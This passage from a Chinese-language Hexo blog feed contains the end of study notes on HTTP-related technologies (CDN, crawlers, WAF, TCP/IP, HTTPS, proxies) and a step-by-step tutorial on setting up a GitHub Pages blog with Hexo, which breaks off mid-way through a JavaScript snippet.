id="4-HTTP关联知识点">4. HTTP关联知识点</h2><h3 id="4-1-HTTP相关应用技术">4.1 HTTP相关应用技术</h3><p><img src="%E4%B8%8B%E8%BD%BD.png" alt=""></p><h4 id="4-1-1-网络">4.1.1 网络</h4><p>  互联网的正式名称是<code>Internet</code>，里面存储着无穷无尽的信息资源，我们通常所说的“上网”实际上访问的只是互联网的一个子集<code>World Wide Web</code>，它基于 HTTP 协议，传输 HTML 等超文本资源，能力也就被限制在 HTTP 协议之内。</p><p>  互联网上还有许多万维网之外的资源，例如常用的电子邮件、<code>BT</code> 和 <code>Magnet</code> 点对点下载、<code>FTP</code> 文件下载、<code>SSH</code> 安全登录、各种即时通信服务等等，它们需要用各自的专有协议来访问。不过由于 HTTP 协议非常灵活、易于扩展，而且“超文本”的表述能力很强，所以很多其他原本不属于 HTTP 的资源也可以“包装”成 HTTP 来访问，即各种“网页应用”。（如“微信网页版”“邮箱网页版”）综合来看，现在的互联网 90% 以上的部分都被万维网，也就是 HTTP 所覆盖。</p><p>​</p><h4 id="4-1-2-Web-服务器">4.1.2 Web 服务器</h4><p>  浏览器是 HTTP 里的请求方，在协议另一端的<strong>应答方</strong>就是<strong>服务器</strong>，<strong>Web Server</strong></p><p>Web服务器时有两个层面的含义：硬件和软件</p><p><strong>硬件</strong>含义就是<strong>物理形式或“云”形式的机器</strong>，在大多数情况下它可能不是一台服务器，而是利用反向代理、负载均衡等技术组成的庞大集群。但从外界看来，它仍然表现为一台机器，但这个形象是虚拟的。</p><p><strong>软件</strong>含义的 Web 服务器可能我们更为关心，它就是提供 Web 服务的应用程序，通常会运行在硬件含义的服务器上。它利用强大的硬件能力响应海量的客户端 HTTP 请求，处理磁盘上的网页、图片等静态文件，或者把请求转发给后面的业务应用，返回动态的信息。</p><p>​</p><p><code>Apache</code> 是老牌的服务器，功能相当完善，相关的资料很多，学习门槛低，是许多创业者建站的入门产品。</p><p><code>Nginx</code> 是后起之秀，高性能、高稳定，且易于扩展，自2004年推出后就不断蚕食<code>Apache</code>的市场份额。</p><p>此外还有 <code>IIS</code>、 <code>Jetty/Tomcat</code> 等，因为性能不是很高，所以在互联网上应用得较少。</p><p>​</p><h4 id="4-1-3-CDN">4.1.3 CDN</h4><p>  浏览器通常不会直接连到服务器，中间会经过“重重关卡”，其中的一个重要角色就叫做 <strong>CDN</strong></p><p>  <strong>内容分发网络</strong><code>Content Delivery Network</code>它应用了 HTTP 协议里的缓存和代理技术，代替源站响应客户端的请求。</p><p>  <strong>CDN</strong>可以缓存源站的数据，让浏览器的请求不用到达源站服务器，直接在“半路”就可以获取响应。如果调度算法很优秀，更可以找到离用户最近的节点，大幅度缩短响应时间。</p><p>  <strong>CDN</strong> 也是现在互联网中的一项重要基础设施，除了基本的网络加速外，还提供负载均衡、安全防护、边缘计算、跨运营商网络等功能，能够成倍地“放大”源站服务器的服务能力，很多云服务商都把其作为产品的一部分。</p><p>​</p><h4 id="4-1-4-爬虫">4.1.4 爬虫</h4><p>  <strong>爬虫</strong><code>Crawler</code>是一种可以自动访问 Web 资源的应用程序。据估计，互联网上至少有 50% 的流量都是由爬虫产生的，某些特定领域的比例还会更高。绝大多数是由各大搜索引擎“放”出来的，抓取网页存入庞大的数据库，再建立关键字索引，这样我们才能够在搜索引擎中快速地搜索到互联网角落里的页面。</p><p>  爬虫也有不好的一面，它会过度消耗网络资源，占用服务器和带宽，影响网站对真实数据的分析，甚至导致敏感信息泄漏。所以，又出现了“反爬虫”技术，通过各种手段来限制爬虫。其中一项就是“君子协定”<code>robots.txt</code>，约定哪些该爬，哪些不该爬。</p><p>​</p><h4 id="4-1-5-WebService-WAF">4.1.5 WebService/WAF</h4><p>  <strong>Web</strong> <strong>Service</strong>是一种由 <code>W3C</code> 定义的应用服务开发规范，使用 <code>client-server</code> 主从架构，通常使用 <code>WSDL</code> 定义服务接口，使用 <code>HTTP</code> 协议传输 <code>XML</code> 或 <code>SOAP</code> 消息，也就是说，它是<strong>一个基于 Web（HTTP）的服务架构技术</strong>，既可以运行在内网，也可以在适当保护后运行在外网。因为采用了 HTTP 协议传输数据，所以在 Web Service 架构里服务器和客户端可以采用不同的操作系统或编程语言开发，(如服务器端用 <code>Linux+Java</code>，客户端用 <code>Windows+C#</code>）具有跨平台跨语言的优点。</p><blockquote><p>Web Service 是网络服务实体，而 Web Server 是网络服务器</p></blockquote><p>​</p><p>  <strong>网络应用防火墙</strong>  <code>WAF</code>  是应用层面的“防火墙”，专门检测 HTTP 流量，是防护 Web 应用的安全技术。WAF 通常位于 Web 服务器之前，可以阻止如 <code>SQL 注入</code>、<code>跨站脚本等攻击</code>，目前应用较多的一个开源项目是 <code>ModSecurity</code>，它能够完全集成进 <code>Apache</code> 或 <code>Nginx</code>。</p><p>​</p><h4 id="4-1-6-小结">4.1.6 小结</h4><ol><li>互联网上绝大部分资源都使用 HTTP 协议传输</li><li>浏览器是 HTTP 协议里的请求方，即 User Agent</li><li>服务器是 HTTP 协议里的应答方，常用的有 Apache 和 Nginx</li><li>CDN 位于浏览器和服务器之间，主要起到缓存加速的作用</li><li>爬虫是另一类 User Agent，是自动访问网络资源的程序</li></ol><p>​</p><p>​</p><h3 id="4-2-HTTP相关协议">4.2 HTTP相关协议</h3><p><img src="2020128.png" alt=""></p><h4 id="4-2-1-TCP-IP">4.2.1 TCP/IP</h4><p>  <code>TCP/IP 协议</code>是目前网络世界事实上的标准通信协议。它实际上是一系列网络通信协议的统称，其中最核心的两个协议是<strong>TCP</strong>和<strong>IP</strong>，其他还有 <code>UDP</code>、<code>ICMP</code>、<code>ARP</code> 等，共同构成了一个复杂但有层次的协议栈。</p><p>  这个协议栈有四层，最上层是<strong>应用层</strong>，最下层是<strong>链接层</strong>，<strong>TCP 属于传输层，IP 属于网际层</strong>。</p><p>  <strong>IP 协议</strong>是<code>Internet Protocol</code>的缩写，主要目的是解决寻址和路由问题，以及如何在两点间传送数据包。IP 协议使用<strong>IP 地址</strong>的概念来定位互联网上的每一台计算机。</p><blockquote><p>现在我们使用的 IP 协议大多数是 v4 版，地址是四个用<code>.</code>分隔的数字（例如<strong>192.168.0.1</strong>），总共有 $2^{32}$，大约 42 亿个可以分配的地址。互联网的快速发展让地址的分配管理很快就捉襟见肘。所以出现了 v6 版，使用 8 组<code>:</code>分隔的数字作为地址，有$ 2^{128}$ 个</p></blockquote><p>​</p><p>  <strong>TCP 协议</strong>是<code>Transmission ControlProtocol</code>（<strong>传输控制协议</strong>）的缩写，它位于 IP 协议之上，基于 IP 协议提供可靠的、字节流形式的通信，是 HTTP 协议得以实现的基础。<strong>可靠</strong>是指保证数据不丢失，<strong>字节流</strong>是指保证数据完整，所以在 TCP 协议的两端可以如同操作文件一样访问传输的数据，就像是读写在一个密闭的管道里流动的字节。</p><p>​</p><p>​</p><h4 id="4-2-2-HTTPS">4.2.2 HTTPS</h4><blockquote><p><strong>HTTP over SSL/TLS</strong>，也就是运行在 SSL/TLS 协议上的 HTTP</p></blockquote><p>  HTTP是不安全的，因为http协议传输的数据都是未加密的明文。为了保证这些隐私数据能加密传输，于是根据<strong>SSL协议</strong><code>Secure Sockets Layer</code>用于对HTTP协议传输的数据进行加密，从而就诞生了HTTPS</p><p>  SSL/TLS是一个负责加密通信的安全协议，建立在 TCP/IP 之上，所以也是个可靠的传输协议，可以被用作 HTTP 的下层。SSL由网景公司发明，当发展到 3.0 时被标准化，改名为 <strong>TLS</strong><code>Transport Layer Security</code>，但由于历史的原因还是有很多人称之为 SSL/TLS，或者直接简称为 SSL</p><p><strong>加密：</strong></p><ul><li>私钥（放在服务器上，用于公钥加密过的数据）</li><li>公钥（放在互联网上，所有人都能拿到的一串加密的字符串，这个加密的字符串是来加密我们的字符信息的。当加密的数据传到服务器上，只有服务器通过私钥解密，才能把公钥加密的数据拿出来）</li></ul><p><strong>https握手的过程：</strong></p><p><img src="Inked%E6%8F%A1%E6%89%8B_LI.jpg" alt=""></p><p><strong>https和http的主要区别：</strong></p><ul><li><p>https协议需要到ca机构申请ssl证书(如沃通CA)，高级别的ssl证书需要一定费用</p></li><li><p>http是超文本传输协议，信息是明文传输，https 则是具有安全性的ssl加密传输协议</p></li><li><p>http和https使用的是完全不同的连接方式，用的端口也不一样（http是80端口，https是443端口）</p></li><li><p>http的连接很简单，是无状态的；https协议是由ssl+http协议构建的可进行加密传输、身份认证的网络协议，更安全</p></li></ul><p>​</p><h4 id="4-2-3-代理">4.2.3 代理</h4><p>  <strong>代理</strong><code>Proxy</code>是 HTTP 协议中请求方和应答方中间的一个环节，作为<strong>中转站</strong>，既可以转发客户端的请求，也可以转发服务器的应答。</p><p>代理有很多的种类，常见的有：</p><ul><li><strong>匿名代理</strong>：完全“隐匿”了被代理的机器，外界看到的只是代理服务器</li><li><strong>透明代理</strong>：顾名思义，它在传输过程中是“透明开放”的，外界既知道代理，也知道客户端</li><li><strong>正向代理</strong>：靠近客户端，代表客户端向服务器发送请求</li><li><strong>反向代理</strong>：靠近服务器端，代表服务器响应客户端的请求（CDN实际上就是一种代理，它代替源站服务器响应客户端的请求，通常扮演着透明代理和反向代理的角色）</li></ul><p>​</p><p>由于代理在传输过程中插入了一个中间层，所以可以在这个环节做很多事，比如：</p><ul><li><strong>负载均衡</strong>：把访问请求均匀分散到多台机器，实现访问集群化</li><li><strong>内容缓存</strong>：暂存上下行的数据，减轻后端的压力</li><li><strong>安全防护</strong>：隐匿 IP, 使用 WAF 等工具抵御网络攻击，保护被代理的机器</li><li><strong>数据处理</strong>：提供压缩、加密等额外的功能</li></ul><blockquote><p>关于 HTTP 的代理还有一个特殊的<strong>代理协议</strong><code>proxy protocol</code>，它由知名的代理软件 <code>HAProxy</code> 制订，但并不是 RFC 标准。</p></blockquote><p>​</p><p>​</p><h4 id="4-2-4-小结">4.2.4 小结</h4><ol><li>TCP/IP 是网络世界最常用的协议，HTTP 通常运行在 TCP/IP 提供的可靠传输基础上</li><li>DNS 域名是 IP 地址的等价替代，需要用域名解析实现到 IP 地址的映射</li><li>URI 是用来标记互联网上资源的一个名字，由“协议名 + 主机名 + 路径”构成，俗称 URL</li><li>HTTPS 相当于“HTTP+SSL/TLS+TCP/IP”，为 HTTP 套了一个安全的外壳</li><li>代理是 HTTP 传输过程中的“中转站”，可以实现缓存加速、负载均衡等功能</li></ol><p>​</p><p>​</p><blockquote><p>完结</p></blockquote><p><img src="%E4%B8%8B%E8%BD%BD22.png" alt="HTTP思维导图"></p><p>​</p><p>​</p><p><a href="https://www.cnblogs.com/chenliyang/p/6558756.html">参考文章</a></p><p><a href="https://http2.akamai.com/demo">HTTP2演示</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> 通信协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Hexo的GitHub博客搭建</title>
      <link href="2020/08/28/github-hexo-blog/"/>
      <url>2020/08/28/github-hexo-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="0-前言-2">0.前言</h2><p><strong>Github Pages</strong></p><ul><li><p>Github Pages允许用户的任何一个Repo的gh-pages分支上的代码可以经由HTTP访问到，类似提供了静态文件服务。不仅可以方便的为项目建立介绍站点，也可以用来建立个人博客。</p></li><li><p>优点：</p></li></ul><ol><li>轻量级的博客系统，没有麻烦的配置</li><li>无需自己搭建服务器</li><li>博客内容可以轻松打包、转移、发布到其它平台；</li><li>可以绑定自己的域名</li></ol><ul><li>缺点：</li></ul><ol><li>使用<a href="https://github.com/mojombo/jekyll">Jekyll</a>模板系统，相当于静态页发布，适合博客，文档介绍等，动态程序的部分受限</li><li>基于Git，很多东西需要动手，不像Wordpress有强大的后台</li></ol><p><strong>Hexo</strong></p><ul><li><p>Hexo是一款基于Node.js的高效静态站点生成框架，可以通过Hexo直接使用Markdown语法来撰写博客而无需关心网页源代码的具体细节，只需要用心写好你的博客内容就好了</p></li><li><p>快速开始</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo s<span class="token comment"># 本地预览博客</span>$ hexo g  <span class="token comment"># 生成博客网页文件</span>$ hexo d<span class="token comment"># 上传网页文件到github</span>$ hexo new post <span class="token string">"article title"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>参考材料：</p><ul><li><p><a href="https://github.com/hexojs/hexo">Hexo-Github地址</a></p></li><li><p><a href="https://hexo.io/zh-cn/docs/">Hexo帮助文档</a></p></li></ul><h2 id="1-环境准备">1.环境准备</h2><h3 id="1-1-安装Node-js">1.1 安装Node.js</h3><ul><li><p><a href="https://nodejs.org/dist/v9.11.1/node-v9.11.1-x64.msi">Node.js下载地址</a></p></li><li><p>安装了Node.js会自动安装npm</p></li><li><p>cmd窗口输入<code>node -v</code>和<code>npm -v</code>验证是否安装成功</p></li><li><p>可以使用阿里的国内镜像进行加速</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="1-2-安装Git">1.2 安装Git</h3><ul><li><p>为了把本地的网页文件上传到github上面去，我们需要用到分布式版本控制工具</p></li><li><p><a href="https://git-scm.com/download/win">Git下载地址</a></p></li><li><p>最后一步添加路径时选择Use Git from the Windows Command Prompt，这样能直接在命令提示符里打开</p></li><li><p>安装完成后在命令提示符中输入git --version验证是否安装成功</p></li></ul><h3 id="1-3-安装Hexo">1.3 安装Hexo</h3><ul><li>cmd窗口输入<code>npm install -g hexo</code></li><li>安装完后输入hexo -v验证是否安装成功</li></ul><h2 id="2-本地部署Hexo">2.本地部署Hexo</h2><h3 id="2-1-初始化目录">2.1 初始化目录</h3><p>在想创建的目录下执行<code>hexo init</code>，这个命令会初始化博客的目录</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20200828-init.gif" alt="博客根目录" style="zoom:80%;"><h3 id="2-2-全局配置">2.2 全局配置</h3><p>在根目录<code>_config.yml</code>里进行全局配置</p><h3 id="2-3-本地启动">2.3 本地启动</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo g <span class="token comment">#生成本地public静态文件</span>hexo s <span class="token comment">#启动本地服务器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>进入http://localhost:4000/ 已经可以看到一篇helleworld的博客</p><h2 id="3-个性化主题">3.个性化主题</h2><h3 id="3-1-推荐主题">3.1 推荐主题</h3><p><a href="https://github.com/litten/hexo-theme-yilia%EF%BC%88%E4%B8%80%E4%B8%AA%E7%AE%80%E6%B4%81%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%BB%E9%A2%98%EF%BC%89">https://github.com/litten/hexo-theme-yilia（一个简洁优雅的主题）</a></p><p><a href="https://github.com/TryGhost/Casper%EF%BC%88%E5%B9%BD%E7%81%B5%E4%B8%BB%E9%A2%98%EF%BC%89">https://github.com/TryGhost/Casper（幽灵主题）</a></p><p><a href="https://github.com/blinkfox/hexo-theme-matery%EF%BC%88%E7%82%AB%E9%85%B7%EF%BC%8C%E5%93%8D%E5%BA%94%E5%BC%8F%E6%9B%B4%E5%8F%8B%E5%A5%BD%EF%BC%89">https://github.com/blinkfox/hexo-theme-matery（炫酷，响应式更友好）</a></p><h3 id="3-2-使用步骤">3.2 使用步骤</h3><ol><li><p>安装主题</p><p>在根目录下<code>git clone</code>你喜欢的主题的代码</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo clean<span class="token function">git</span> clone https://github.com/litten/hexo-theme-yilia.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>启用主题</p><p>修改根目录的<code>_config.yml</code>配置文件中的theme属性，将其设置为yilia（默认是landscape）</p></li></ol><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20200828-yilia.png" style="zoom:80%;"><ol start="3"><li><p>本地启动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo ghexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h2 id="4-部署到GitHub">4.部署到GitHub</h2><h3 id="4-1-创建远程仓库">4.1 创建远程仓库</h3><ol><li><p>GitHub新建一个仓库,仓库名为<code>用户名.github.io</code></p><p>名称一定要和github用户名完全一样，比如你github用户名叫<code>abc</code>，那么仓库名为<code>abc.github.io</code></p></li><li><p>修改根目录下的<code>_config.yml</code>配置文件</p><p>url：GitHub Pages网址<code>https://GitHub用户名.github.io</code></p></li></ol><h3 id="4-2-连接Github与本地">4.2 连接Github与本地</h3><ol><li><p>右键打开git bash，输入命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"night-candle"</span> <span class="token comment">#用户名和邮箱根据注册github的信息修改</span><span class="token function">git</span> config --global user.email <span class="token string">"0123456789@qq.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>生成密钥SSH key：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将生成的公钥添加到github中（头像下面点击<code>settings</code>，再点击<code>SSH and GPG keys</code>，新建一个SSH进行添加）</p></li><li><p>测试，输入命令，如果如下图所示，出现用户名则成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -T git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220113-github-test.png" alt="设置成功" style="zoom:80%;"></li><li><p>打开根目录下<code>_config.yml</code>文件，修改最后一行deploy的配置，repository修改为自己的github项目地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deploy:- type: <span class="token function">git</span>  repository:    github: git@github.com:night-candle/night-candle.github.io.git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将本地推送到GitHub远程仓库，在git bash输入以下指令</p><pre class="line-numbers language-none"><code class="language-none">hexo cleanhexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>​</p></li></ol><h2 id="5-使用">5.使用</h2><h3 id="5-1-添加文章">5.1 添加文章</h3><ol><li><p>git bash安装扩展<code>npm i hexo-deployer-git</code></p></li><li><p>然后输入<code>hexo new post "article title"</code>，新建一篇文章</p></li><li><p>然后打开<code>\source\_posts</code>的目录，多了一个文件夹和一个<code>.md</code>文件，一个用来存放图片等数据，另一个是文章</p></li><li><p>编写完markdown文件后，根目录下输入<code>hexo g</code>生成静态网页，最后输入<code>hexo d</code>上传到github上</p></li><li><p>文件头如下</p><pre class="line-numbers language-none"><code class="language-none">toc: true    # 是否有目录reward: true  # 是否有打赏title: vuex   # 标题名称tags:     # 小标签- 随笔- vue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="5-2-文章-Front-matter-介绍">5.2 文章 Front-matter 介绍</h3><h4 id="Front-matter-选项详解">Front-matter 选项详解</h4><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2">开源中国在线工具</a>、<a href="http://encode.chahuo.com/">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx">站长工具</a>。</li><li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><h4 id="最简示例">最简示例</h4><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="最全示例">最全示例</h4><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token key atrule">author</span><span class="token punctuation">:</span> <span class="token key atrule">img</span><span class="token punctuation">:</span> /source/images/xxx.jpg<span class="token key atrule">top</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">cover</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">coverImg</span><span class="token punctuation">:</span> /images/1.jpg<span class="token key atrule">password</span><span class="token punctuation">:</span> 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92<span class="token key atrule">toc</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">mathjax</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">summary</span><span class="token punctuation">:</span> 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要<span class="token key atrule">categories</span><span class="token punctuation">:</span> Markdown<span class="token key atrule">tags</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> Typora  <span class="token punctuation">-</span> Markdown<span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-3-隐藏文章">5.3 隐藏文章</h3><blockquote><p>隐藏的文章仍然可以通过连接访问到</p></blockquote><ol><li><p>安装插件 <a href="https://github.com/prinsss/hexo-hide-posts">hexo-hide-posts</a></p></li><li><p>Front-matter 添加 <code>hidden: true</code></p></li><li><p><code>hexo hidden:list</code> 获取当前所有的已隐藏文章列表</p></li><li><p>完全隐藏使用Hexo草稿功能</p></li></ol><p>参考：<a href="https://printempw.github.io/hexo-plugin-to-make-posts-sage-unlisted/">为 Hexo 博客添加隐藏文章功能</a></p><h3 id="5-4-草稿">5.4 草稿</h3><ol><li><p><code>draft</code>这种布局在建立时会被保存到 <code>source/_drafts</code> 文件夹</p></li><li><p>可通过 <code>publish</code> 命令将草稿移动到 <code>source/_posts</code> 文件夹，命令中指定 <code>layout</code> 来指定布局</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo publish <span class="token punctuation">[</span>layout<span class="token punctuation">]</span> <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>草稿默认不会显示在页面中，可在执行时加上 <code>--draft</code> 参数，或是把 <code>render_drafts</code> 参数设为 <code>true</code> 来预览草稿</p></li></ol><h2 id="6-补充">6. 补充</h2><h3 id="6-1-绑定域名">6.1 绑定域名</h3><p>打开github项目，点击<code>settings</code>，拉到下面<code>Custom domain</code>处，填上你自己的域名，保存</p><p>项目根目录会出现一个名为<code>CNAME</code>的文件。（如果没有，手动创建<code>CNAME</code>文件，注意没有后缀，然后在里面写上域名保存）</p><h3 id="6-2-添加评论插件">6.2 添加评论插件</h3><ol><li><p>获取Client ID和Client Secret</p><p><a href="https://github.com/settings/applications/new">https://github.com/settings/applications/new</a></p></li></ol><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20220113-register.jpg" alt="注册" style="zoom:80%;"><ol start="2"><li>在Settings/Developer settings/OAuth Apps中可以找到Client ID和Client Secret</li></ol><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20220113-oAuth.jpg" alt="" style="zoom:80%;"><ol start="3"><li><p>配置文件<code>_config.yml</code>下修改<code>gitalk</code></p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">gitalk</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">owner</span><span class="token punctuation">:</span> 你的github用户名  <span class="token key atrule">repo</span><span class="token punctuation">:</span> 你的github用户名.github.io  <span class="token key atrule">oauth</span><span class="token punctuation">:</span>    <span class="token key atrule">clientId</span><span class="token punctuation">:</span> 粘贴刚刚注册完显示的字符串    <span class="token key atrule">clientSecret</span><span class="token punctuation">:</span> 粘贴刚刚注册完显示的字符串  <span class="token key atrule">admin</span><span class="token punctuation">:</span> 你的github用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="6-3-备份博客源文件">6.3 备份博客源文件</h3><ol><li>本地克隆github.io的远程仓库</li><li>创建新的远程分支，用来备份hexo源文件</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout -b hexo_source<span class="token function">git</span> push origin hexo_source:hexo_source<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>创建忽略规则文件 <code>.gitignore</code></li></ol><p>按需添加如下内容：</p><pre class="line-numbers language-none"><code class="language-none">.DS_StoreThumbs.dbdb.json  *.log.deploy*/node_modules/.npmignorepublic/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>添加内容到仓库并提交到远程仓库</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span><span class="token function">git</span> commit -m <span class="token string">"first commit"</span><span class="token function">git</span> push -u origin hexo_source<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><a href="https://lvraikkonen.github.io/2016/05/31/%E5%88%A9%E7%94%A8Github%E5%88%86%E6%94%AF%E5%A4%87%E4%BB%BDHexo%E6%BA%90%E6%96%87%E4%BB%B6/">教程</a></p><p>​</p><h3 id="6-4-个性化设置">6.4 个性化设置</h3><h4 id="动态标签栏">动态标签栏</h4><p>在<code>theme/matery/layout/layout.ejs</code>下添加如下代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span> <span class="token keyword">var</span> OriginTitile <span class="token operator">=</span> document<span class="token punctuation">.</span>title<span class="token punctuation">,</span> st<span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"visibilitychange"</span><span class="token punctuation">,</span> <span class="token 